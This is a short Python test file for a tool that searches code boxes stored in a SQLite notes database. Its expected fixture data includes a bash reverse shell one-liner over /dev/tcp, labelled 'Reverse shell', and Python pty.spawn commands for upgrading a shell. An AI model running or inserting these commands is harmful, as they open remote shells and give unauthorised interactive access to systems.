from cherry_picker.database import SQLiteClient
from cherry_picker.models import Codebox
from tests import DATA_DIR

db_path = DATA_DIR / "test.db"


def test_sqlite_client_node_search():
    client = SQLiteClient(db_path)
    checkboxes = client.query_codebox_nodes_by_node("%shell%")
    assert checkboxes == [
        Codebox(
            idx=0,
            txt="$ bash -i >& /dev/tcp/0.0.0.0/9001 0>&1",
            node_name="Reverse shell",
        )
    ]


def test_sqlite_client_txt_search():
    client = SQLiteClient(db_path)
    checkbox = client.query_codebox_nodes_by_txt("$ python%")[0]
    assert checkbox == Codebox(
        idx=0,
        txt="$ python -c \"import pty;pty.spawn('/bin/bash')\"\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\"",
        node_name="Python",
    )
